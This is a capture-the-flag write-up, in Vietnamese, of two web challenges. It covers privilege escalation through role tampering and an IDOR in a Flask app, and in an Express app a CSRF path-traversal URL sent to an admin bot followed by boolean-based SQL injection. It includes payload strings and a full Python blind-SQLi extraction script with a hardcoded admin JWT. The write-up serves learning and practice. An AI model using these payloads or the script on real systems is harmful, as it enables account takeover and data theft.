# Puzzle

Đề bài cung cấp một chương trình flask với các route:

- Đăng nhập / đăng ký: `/confirm-register`

- Xem các bài articles: `/home` `/articles/<uuid>`

- Xem danh sách collab giữa các author: `/collab/requests`

- Yêu cầu / chấp nhận collab: `/collab/request/<articals-suuid>` `/collab/accept/<articals-uuid>`

- Xem thông tin user gồm mật khẩu: `/users/<uuid>`

- Page admin: `/admin` `/data` `/db`

Sau khi tiến hành audit code, ta nhận thấy rằng chương trình cung cấp cho chúng ta cách lấy thông tin của một tài khoản bao gồm tài khoản admin bằng route /user. Vấn đề hiện tại là ta không có được uuid của admin.

Mục tiêu của ta là chiếm được tài khoản của admin. Ta thực hiện tìm kiếm các chức năng trả về thông tin của người dùng trong dịch vụ, ta chú ý route `/user/<uuid>`:

```python
@app.route('/users/<string:target_uuid>')
def get_user_details(target_uuid):
    current_uuid = session.get('uuid')
    current_user = get_user_by_uuid(current_uuid)
    if not current_user or current_user['role'] not in ('0', '1'):
        return jsonify({'error': 'Invalid user role'}), 403
```

Đây là route duy nhất trong chương trình cho phép tìm kiếm ngược thông tin tài khoản từ uuid người dùng. Chi tiết method `get_user_by_uuid` thực hiện query `WHERE username = ?` Lúc này ta có hai vấn đề cần được giải quyết:

- Ta không có uuid của admin

- Tài khoản mặc định của người dùng có role là '2', để sử dụng route này cần có tài khoản 1 hoặc 0

**Tạo tài khoản với role 1**

Logic đăng kí tài khoản mặc định role là 2, ta có thể đăng kí tài khoản với role là 1 để tiếp tục khai thác tại vì logic chỉ cấm đăng kí tài khoản với role là 0.

```python
@app.route('/confirm-register', methods=['POST'])
def confirm_register():
    role = request.form.get('role', '2')
    if role == '0':
      return jsonify({'error': 'Admin registration is not allowed.'}), 403
```

Ta tiến thành đăng ký một tài khoản mới với role là 1, lúc này ta đã có thể sử dụng route `/users/<uuid>`

![](/home/nguyenlong05/.config/marktext/images/2025-10-05-11-16-19-image.png)

**Lấy uuid của admin và xem thông tin admin**

Việc làm tiếp theo là cần leak uuid của admin. Ta thấy rằng uuid của người đăng artircle và người collab trong mã nguồn HTML của chương trình:

```html
  <div class="card-body">
      <h1 class="card-title">{{ article.title }}</h1>
          <div class="text-muted mb-4">
             <span class="d-none author-uuid">{{ article.author_uuid }}</span>
              {% if article.collaborator_uuid %}
              <span class="d-none collaborator-uuid">{{ article.collaborator_uuid }}</span>
             {% 
```

Vậy, để leak uuid của admin ta chỉ cần đơn giản tạo một article rồi collab với admin, vấn đề là ta cần phải được người collab, tức admin chấp nhận yêu cầu collab. Ta tiếp tục khai thác lỗi tiếp theo, khi mà article uuid của ta được công khai kết hợp với việc `/collab/accept/<article-uuid>` không xác minh người dùng. Từ đó ta có thể thực hiện IDOR để chấp nhận article của chính mình collab với admin.

![](/home/nguyenlong05/.config/marktext/images/2025-10-05-11-27-54-image.png)

Sau khi lấy được articles collab với admin, thực hiện accept

![](/home/nguyenlong05/.config/marktext/images/2025-10-05-11-29-57-image.png)

Truy cập vào `/home` để xem các articles, ta lấy được uuid của admin:

![](/home/nguyenlong05/.config/marktext/images/2025-10-05-11-31-50-image.png)

Với role người dùng hiện tại là 1, ta thực hiện trích xuất thông tin của admin:

![](/home/nguyenlong05/.config/marktext/images/2025-10-05-11-33-16-image.png)

**flag**

Sau khi thực hiện vào tài khoản admin, ta kéo file zip về và thực hiện forensic.

![](/home/nguyenlong05/.config/marktext/images/2025-10-05-11-36-07-image.png)

# Secrets

Đây là một chương trình sử dụng express với các route như sau:

- Đăng ký / đăng nhập `/register` `/login`

- Ghi thông tin/ ghi bí mật: `/msg` `/secrets`

- Gọi bot: `/report`

- Xem thông tin user và admin: `/user/profile?id=?` `/admin`

Với hint được cung cấp là CSRF, ta thực hiện phân tích bot được cung cấp:

```js
const JWT_SECRET = process.env.JWT_SECRET || "supersecret";

router.post("/", authMiddleware, async (req, res) => {
  const { url } = req.body;

  if (!url || !url.startsWith("http://localhost:3000")) {
    return res.status(400).send("Invalid URL");
  }

  const token = jwt.sign({ id: admin.id, role: admin.role }, JWT_SECRET, { expiresIn: "1h" });
  <<<TRIMED>>>
  await page.setCookie({
    name: "token",
    value: token,
    domain: "localhost",
    path: "/",
  });
   // Visit the reported URL
  await page.goto(url, { waitUntil: "networkidle2" });
```

Ta nhận thấy rằng con bot thực hiện force 1 JWT của admin, sau đó truy cập vào URL được cung cấp với cookie chứa JWT của admin. Từ đó ta có thể khẳng định hướng đi tiếp theo chính là thực hiện XSS/CSRF để lấy được cookie admin.

Với hint là CSRF, ta thực hiện phân tích các mã nguồn ejs có ích. Trong quá trình audit code, với kinh nghiệm của mình có thể nhận xét các route liên quan tới đăng kí/ đăng nhập và logic JWT chuẩn như sách giáo khoa. Từ đó ta đặt nghi vấn lên route `addAdmin` tại vì nó có quyền cung cấp admin và chức năng ghi log (chức năng có vẻ thừa thãi trong  chương trình).

![](/home/nguyenlong05/.config/marktext/images/2025-10-05-12-22-59-image.png)

Đây là một code snippet từ `profile.ejs` nằm trong script tag. Tại đây ta có thể chia quá trình hoạt động ra 2 phần khi truy cập vào `/user/profile?id=xxx`:

- Phần đầu tiên người dùng/bot thực hiện request tới path trên, express vào controller tương ứng là `userController.getProfile` như sau:
  
  ```js
   exports.getProfile = async (req, res) => {
    try {
      const userId = parseInt(req.query.id);
      ...
      const user = await User.findById(userId );
      ...
      res.render("profile", { user, currUser: req.user });
  ```

        Tại đây ta chú ý thấy chương trình sử dụng `parseInt` ([parseInt() - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt)). Hàm này có đặc điểm parse lại input, ở đây là param `id`. Vô tình nó đã mở ra một số con đường để ta khai thác do hàm parse này chuẩn hóa input vô cùng tốt.

- Phần thứ hai trong quá trình render page là sau khi request GET trên được hoàn thành, HTML được gửi về và trình duyệt bắt đầu thực thi JavaScript trong profile.ejs. Tại đây ta lưu ý thấy chương trình thực hiện POST đến `"/log/" + profileId` với credential = include. Ta nhận thấy ngay rằng ta có thể thực hiện path traversal tại đây.

Kết hợp sự đặc biệt của 2 quá trình trên, ta có thể thực hiện path traversal với input là `id=x/../../` . Khi đó chương trình sẽ thực hiện POST request tới path tùy ý mà không gây ra lỗi chương trình trong controller getProfile do hàm parseInt.

Ta sẽ khiến bot thực hiện POST request đến `add/addAdmin` với user id lại nằm ở trong phần JSON được gửi đi thay vì là trong param id.

Payload: `http://localhost:3000/user/profile/?id=102/../../admin/addAdmin`

**SQL injection**

Audit code ta thực hiện phân tích các câu query không được bind param:

```js
  findAll: async (filterField = null, keyword = null) => {
    const { clause, params } = filterHelper("msgs", filterField, keyword);

    const query = `
      SELECT msgs.id, msgs.msg, msgs.type, msgs.createdAt, users.username
      FROM msgs
      INNER JOIN users ON msgs.userId = users.id
      ${clause || ""}
      ORDER BY msgs.createdAt DESC
    `;
```

```js
function filterBy(table, filterBy, keyword, paramIndexStart = 1) {
  if (!filterBy || !keyword) {
    return { clause: "", params: [] };
  }

  const clause = ` WHERE ${table}."${filterBy}" LIKE $${paramIndexStart}`;
  const params = [`%${keyword}%`];

  return { clause, params };
}
```

Ta có thể nhận xét `keyword` được bind an toàn như một parameter. Nhưng `table` và `filterBy` được chèn trực tiếp vào câu SQL như các identifier. Ta có thể thực hiện payload với kĩ thuật boolean based:

`filterBy=id"+IS+NOT+NULL+AND+EXISTS(select+1+from+flags+where+ascii(substring(flag,1,1))<0)+AND+"msg&keyword=a`

full script:

```python
import re
import time
import html
import requests

BASE = "http://web1-79e4a3bc.p1.securinets.tn"
ADMIN_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAyLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NTk1OTk0NTgsImV4cCI6MTc1OTYwMzA1OH0.Y0IuDxOkgSZyJAlFw872E_DbA6GEB5z-amUvrQ7-zH8"
SRV_COOKIE = None 

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Origin": BASE,
    "Referer": f"{BASE}/admin/msgs",
})

def set_cookies():
    session.cookies.set("token", ADMIN_JWT, domain="web1-79e4a3bc.p1.securinets.tn", path="/")
    if SRV_COOKIE:
        session.cookies.set("SRV", SRV_COOKIE, domain="web1-79e4a3bc.p1.securinets.tn", path="/")

def get_csrf():
    r = session.get(f"{BASE}/admin/msgs", timeout=15)
    r.raise_for_status()
    m = re.search(r'name="_csrf"\s+value="([^"]+)"', r.text)
    if not m:
        j = session.get(f"{BASE}/csrf-token", timeout=15).json()
        return j["csrfToken"]
    return html.unescape(m.group(1))

def test_condition(pos: int, threshold: int, csrf_token: str, ge: bool = True) -> bool:
    op = ">=" if ge else "<"
    filter_by = f'id" IS NOT NULL AND EXISTS(SELECT 1 FROM flags WHERE ASCII(SUBSTRING(flag,{pos},1)) {op} {threshold}) AND "msg'
    data = {
        "_csrf": csrf_token,
        "filterBy": filter_by,
        "keyword": "%",
    }
    r = session.post(f"{BASE}/admin/msgs", data=data, timeout=25)
    r.raise_for_status()
    m = re.search(r"<tbody>(.*?)</tbody>", r.text, flags=re.S|re.I)
    tbody = m.group(1) if m else ""
    rows = re.findall(r"<tr>", tbody, flags=re.I)
    return len(rows) >= 1

def leak_char(pos: int, csrf_token: str) -> str:
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi + 1) // 2
        ok = test_condition(pos, mid, csrf_token, ge=True)
        if ok:
            lo = mid
        else:
            hi = mid - 1
    return chr(lo)

def main():
    set_cookies()
    csrf = get_csrf()
    print(f"[+] CSRF token: {csrf}")

    flag = ""
    for pos in range(1, 200):
        ch = leak_char(pos, csrf)
        flag += ch
        print(f"[+] pos {pos}: {ch!r}  =>  {flag}")
        if ch == "}":
            break
        time.sleep(0.1)

    print("\n[+] DONE. Flag:", flag)

if __name__ == "__main__":
    main()
```
